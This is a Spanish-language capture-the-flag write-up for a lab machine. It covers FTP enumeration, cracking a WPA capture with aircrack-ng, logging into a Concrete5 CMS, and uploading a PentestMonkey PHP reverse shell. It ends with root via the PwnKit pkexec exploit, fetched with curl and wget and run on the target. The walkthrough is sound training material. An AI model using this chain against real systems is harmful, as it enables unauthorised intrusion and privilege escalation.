### Tags: `aircrack-ng` `FTP` `Concrete5` `pkexec`

# Escaneo (*80, 4012, 6001, 4019, 5901*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/eb8f0f3e-97ed-456a-86a0-bb2d1f86a74b)
![image](https://github.com/user-attachments/assets/9fba341a-2568-459a-90f6-fa4d207505e6)

# Port 4019 `->` *FTP*

Nos conectamos por ftp como `anonymous` 

```ruby
 ftp <IP> -p 4019
```

Nos traemos todo lo que haya para nuestra maquina de esta manera

![image](https://github.com/user-attachments/assets/51563bb0-de21-4b94-959e-5dbe901c06ed)
![image](https://github.com/user-attachments/assets/b7196fe6-1051-40d0-9068-e44d82721810)


Vemos que nos transferimos los 3 archivos 

![image](https://github.com/user-attachments/assets/56bfdc23-61ce-4174-9ccc-5e1aa4e7fbe9)

### Note.txt

El archivo `note.txt` dice básicamente dice que han incluido los archivos **Wireshark** para registrar toda la actividad inusual y un posible user `adam`

```txt
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)
```

### Quicknote.txt

Después tenemos el archivo `.quicknote.txt`, que dice que dejó un archivo `.cap` para recordar como había entrado

```txt
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!
```

### SamsNetwork.cap

Como vimos en la pistas, tenemos el archivo `.cap` y  se trata de un ataque de captura de datos de un ataque wifi, por ende lo tenemos que descifrar con `aircrack` de esta forma

```ruby
aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt 
```

![image](https://github.com/user-attachments/assets/06ee248e-f703-4ae2-a800-24cb0945cd80)

# Port 80

Ahora **enumeramos** el puerto 80 de la maquina, observamos que es un CMS `concrete5 8.5.2`, agregamos al **/etc/hosts** `superspam.thm`

![image](https://github.com/user-attachments/assets/0ec00e07-540b-4e33-a8e7-17521cf6340c)

En la web encontramos **posibles usuarios** ya que había posts en donde figuraban sus nombre, enumeramos estos:

```txt
Benjamin_Blogger
Lucy_Loser 
Donald_Dump 
Adam_Admin
```

Investigando el web encontramos ``un panel de login``, entonces vamos a probar con los **usuarios que encontramos** y con la contraseña `sandiago` que rompimos con **aircrack-ng**
- Después de loguearnos como `Donald_Dump:sandiago`  tenemos esta web:

![image](https://github.com/user-attachments/assets/2d84a276-1b54-4915-8851-8efd4a4fd637)

Ahora lo que hacemos es poner `http://<IP>` y clickear en un de estas imágenes

![image](https://github.com/user-attachments/assets/72755bf1-17e5-4b9b-9073-1064e3c15f78)

Ahora nos vamos a acá **-->** (que esta arriba ala derecha)

![image](https://github.com/user-attachments/assets/6a534623-f674-4642-8bef-abe50d58c8eb)

Nos aparecerá esto:

![image](https://github.com/user-attachments/assets/a144177d-722b-4f63-9220-dcf4091c1086)

Antes hacer esto para poder subir un ReverseShell en php porque sino no te deja 

![image](https://github.com/user-attachments/assets/d9604a01-149a-4b11-a136-5c5290d9f840)

Ahora lo que hacemos es subir un `reverseShell` en PHP [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y lo subimos a donde dice `Upload Files`. (Antes de subirlo nos ponemos en escucha con `netcat`)

![image](https://github.com/user-attachments/assets/cb638d8f-fedf-45a2-8bad-af4a5f51a3cf)

Clickeamos en donde esta nuestra `reverseShell` 

![image](https://github.com/user-attachments/assets/29abbf28-7bbe-4c2d-a3ad-a4ccaf797320)

Y estamos dentro! 

![image](https://github.com/user-attachments/assets/c537bc17-13b4-498e-a76b-17eedc345f71)

Hacemos el tratamiento de la ``TTY``

```ruby
script /dev/null -c bash
Ctrl + z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 42 columns 189
```


# Escalada `ROOT`

Buscando privilegios SUID encontramos el `pkexec`

![image](https://github.com/user-attachments/assets/44feef73-2d02-4a07-9055-48f44de1292a)

Para explotarlo se hace de esta forma `--->` Enlace: [PwnKit_GitHub](https://github.com/ly4k/PwnKit)

```ruby
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit

#Lo compartimos a la maquina víctima
python3 -m http.server
```

![image](https://github.com/user-attachments/assets/c56c85f3-df72-4ac8-a1ba-1b274d7aaba6)

Ahora con `wget` nos traemos el **PwnKit**, le damos permisos de ejecución y listo somo `ROOT`

![image](https://github.com/user-attachments/assets/cd742d33-c123-4293-8893-0058c0a27742)
![image](https://github.com/user-attachments/assets/27fcd171-a9c6-4bd5-bd15-fcbe431e1d61)

Encontramos esto y jugando con [CyberChef](https://gchq.github.io/CyberChef/) lo desciframos

![image](https://github.com/user-attachments/assets/df30eb57-5c97-4b80-9ebf-48cefbb7ba97)

![image](https://github.com/user-attachments/assets/8725a7db-6d18-42ed-a3cf-99d2538307ce)

Este es el mensajito encriptado que dejaba

```txt
This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be back with a bigger, more dastardly plan to get rid of that inferior operating system, Linux.
```





